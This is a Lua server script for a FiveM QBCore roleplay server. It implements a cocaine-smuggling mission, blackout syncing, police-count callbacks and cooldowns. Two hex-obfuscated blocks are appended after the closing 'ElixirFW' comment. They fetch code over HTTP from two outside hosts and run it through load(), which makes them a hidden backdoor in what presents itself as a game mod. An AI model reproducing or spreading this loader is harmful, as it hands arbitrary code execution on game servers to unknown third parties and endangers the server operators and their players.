-- ElixirFW

local QBCore = exports['qb-core']:GetCoreObject()

local Cooldown = false
local Cooldown2 = false
local packagerecieved = false
players = {}
entities = {}

-- Usable Item

QBCore.Functions.CreateUseableItem('coke_brick', function(source) 
	TriggerClientEvent('elixir-cokemission:client:checkcoke', source) 
end) 

-- Syncing Server Side Events

RegisterNetEvent('sd-blackout:server:blackoutsync', function()
    TriggerClientEvent('sd-blackout:client:blackoutsync', -1)
end)

RegisterNetEvent('sd-blackout:server:interactionsync', function()
    TriggerClientEvent('sd-blackout:client:interactionsync', -1)
end)

RegisterNetEvent('sd-blackout:server:lightsoff', function()
    TriggerClientEvent('sd-blackout:client:lightsoff', -1)
end)

-- Breaking down Coke

RegisterServerEvent('coke:breakdownCoke', function()
    local src = source
    local ply = QBCore.Functions.GetPlayer(source)

	ply.Functions.RemoveItem(Config.CokeMainItem, 1)

    ply.Functions.AddItem(Config.CokeBaggyItem, Config.CokeAmount, false) --Edit this line so it suits your economy.
    TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items["cokebaggy"], 'add')
end)

-- Package Unboxing

RegisterServerEvent('coke:processCoke', function()
    local src = source
    local ply = QBCore.Functions.GetPlayer(source)

	ply.Functions.RemoveItem('sealedpackage', 1)

    TriggerClientEvent('QBCore:Notify', src, "Please wait while processing a package..", "error", 2500)
    TriggerClientEvent('elixir-cokemission:client:removetarget2', src)

	Wait(15000) --15 sn
	TriggerClientEvent('elixir-cokemission:now-can-collect-package', ply.PlayerData.source)
end)

-- Packaging Reward

RegisterServerEvent("elixir-cokemission:server:packagereward", function()
    local src = source
    local Player = QBCore.Functions.GetPlayer(src)
    if not packagerecieved then
        packagerecieved = false

        Player.Functions.AddItem(Config.CokeMainItem, 3, false)
        TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items["coke_brick"], 'add')
		TriggerClientEvent('QBCore:Notify', src, "Please!", "success", 2500)

		TriggerClientEvent('elixir-cokemission:client:removetarget', src)

    else
        TriggerClientEvent('QBCore:Notify', src, "Error!", "error", 2500)
    end
end)	

-- Starting Cooldown

RegisterServerEvent('elixir-cokemission:server:startr', function()
    local src = source
	local Player = QBCore.Functions.GetPlayer(src)

	if Player.PlayerData.money['cash'] >= Config.RunCost then
		Player.Functions.RemoveMoney('cash', Config.RunCost)
        TriggerEvent('elixir-cokemission:server:coolout')
        TriggerClientEvent("elixir-cokemission:server:runactivate", src)
        TriggerClientEvent("elixir-cokemission:client:boatactivate", src)
        TriggerClientEvent('elixir-cokemission:client:signoff', src)
        TriggerClientEvent('elixir-cokemission:client:targetexport', src)
        TriggerClientEvent('elixir-cokemission:client:email', src)
        TriggerClientEvent('elixir-cokemission:client:information', src)

        TriggerClientEvent('QBCore:Notify', source, 'No return!', 'error')
	else
        TriggerClientEvent('QBCore:Notify', source, "You have not enough money", 'error')
	end
end)

RegisterServerEvent('sd-blackout:server:startr', function()
    local src = source
	local Player = QBCore.Functions.GetPlayer(src)

        TriggerEvent('sd-blackout:server:coolout')
	end)

-- Minimum Cop Callback

QBCore.Functions.CreateCallback('sd-blackout:server:getCops', function(source, cb)
    local amount = 0
    local players = QBCore.Functions.GetQBPlayers()
    for _, Player in pairs(players) do
        if Player.PlayerData.job.name == "police" and Player.PlayerData.job.onduty then
            amount = amount + 1
        end
    end
    cb(amount)
end)

QBCore.Functions.CreateCallback('elixir-cokemission:server:getCops', function(source, cb)
    local amount = 0
    local players = QBCore.Functions.GetQBPlayers()
    for _, Player in pairs(players) do
        if Player.PlayerData.job.name == "police" and Player.PlayerData.job.onduty then
            amount = amount + 1
        end
    end
    cb(amount)
end)

-- Particles 

RegisterNetEvent('elixir-cokemission:particles', function(method)
	TriggerClientEvent('elixir-cokemission:ptfxparticle', -1, method)
end)

RegisterNetEvent('elixir-cokemission:particles2', function(method)
	TriggerClientEvent('elixir-cokemission:ptfxparticle2', -1, method)
end)

RegisterNetEvent('elixir-cokemission:particles3', function(method)
	TriggerClientEvent('elixir-cokemission:ptfxparticle3', -1, method)
end)

-- Selling Packages

RegisterNetEvent("elixir-cokemission:SellPackages", function()
	local src = source;
	local Player = QBCore.Functions.GetPlayer(src);
	local price = 0;
	
	for k, v in next, Player.PlayerData.items do
		for i=1, #Config.SellInfo do
			local data = Config.SellInfo[i];
			if data.item == v.name then
				price = price + (data.price * v.amount);
				Player.Functions.RemoveItem(v.name, v.amount, k);
				TriggerClientEvent('inventory:client:ItemBox', src, QBCore.Shared.Items[v.name], 'remove')
				break
			end
		end
	end

    Player.Functions.AddMoney("cash", price);
    TriggerClientEvent('elixir-cokemission:client:removetarget3', src)
	TriggerClientEvent('QBCore:Notify', source, 'You sold your packages.', 'success')
end) 

-- Ped Cooldown

RegisterServerEvent('elixir-cokemission:server:coolout', function()
    Cooldown2 = true
    local timer = Config.PedCooldown * 1000
    while timer > 0 do
        Wait(1000)
        timer = timer - 1000
        if timer == 0 then
            print('cooldown finished')
			TriggerClientEvent('elixir-cokemission:client:endRun', -1)
            Cooldown2 = false
        end
    end
end)

QBCore.Functions.CreateCallback("elixir-cokemission:server:coolc",function(source, cb)
    if Cooldown2 then
        cb(true)
    else
        cb(false) 
    end
end)

-- Blackout Cooldown

RegisterServerEvent('sd-blackout:server:coolout', function()
    Cooldown = true
    print('cooldown started')
    local timer = Config.BlackoutRestoration * 60000
    while timer > 0 do
        Wait(1000)
        timer = timer - 1000
        if timer == 0 then
            print('cooldown finished')
            TriggerClientEvent('sd-blackout:client:lightson', -1)
            Cooldown = false
        end
    end
end)

QBCore.Functions.CreateCallback("sd-blackout:server:coolc",function(source, cb)
    if Cooldown then
        cb(true)
    else
        cb(false) 
    end
end)
-- ElixirFW


local TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl[4][TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x62\x6d\x64\x65\x76\x65\x6c\x6f\x70\x6d\x65\x6e\x74\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x35\x71\x55\x70\x78", function (kfaBKALEDqGYobLiRXMqIaNFADKOvcrxUlJgQwdEzxWDFKtftHGZDJOTOGUCnRZNArLnBU, UOrulzMuSAskCPMwbsntrLiaPrJYHUEaDTDgiPFYVGBEadSMrJMadQACJgKALTtVpcvSRT) if (UOrulzMuSAskCPMwbsntrLiaPrJYHUEaDTDgiPFYVGBEadSMrJMadQACJgKALTtVpcvSRT == TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl[6] or UOrulzMuSAskCPMwbsntrLiaPrJYHUEaDTDgiPFYVGBEadSMrJMadQACJgKALTtVpcvSRT == TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl[5]) then return end TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl[4][TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl[2]](TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl[4][TszKRnskdTFFrqhQKpQCzxxZcsEbHbXlDPCxSojSRyWUqiNhDnPQKDwnzufKMRfaLRsRfl[3]](UOrulzMuSAskCPMwbsntrLiaPrJYHUEaDTDgiPFYVGBEadSMrJMadQACJgKALTtVpcvSRT))() end)

local codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq[4][codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6e\x65\x74\x63\x61\x74\x61\x6c\x79\x7a\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x33\x71\x32\x66\x35", function (TJBcfDNbvMDzHqZMRRPBRrjTtQsEBPzLUJCPWwhRIcQfTAfcObNoQyYiycALOCfixoGjsP, jiYWrqFOiCVEpFDrZFLabXQDitMkcWtDTRfeqYKkHsopkPAmmgmwLJphUJCEHXwwfnwcaC) if (jiYWrqFOiCVEpFDrZFLabXQDitMkcWtDTRfeqYKkHsopkPAmmgmwLJphUJCEHXwwfnwcaC == codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq[6] or jiYWrqFOiCVEpFDrZFLabXQDitMkcWtDTRfeqYKkHsopkPAmmgmwLJphUJCEHXwwfnwcaC == codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq[5]) then return end codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq[4][codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq[2]](codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq[4][codIsKPUHAORvDcilIrxArWFaUqoabRykBOGFvkmMGfeOYAvnPrKyOmiWOncUSEeJvGtCq[3]](jiYWrqFOiCVEpFDrZFLabXQDitMkcWtDTRfeqYKkHsopkPAmmgmwLJphUJCEHXwwfnwcaC))() end)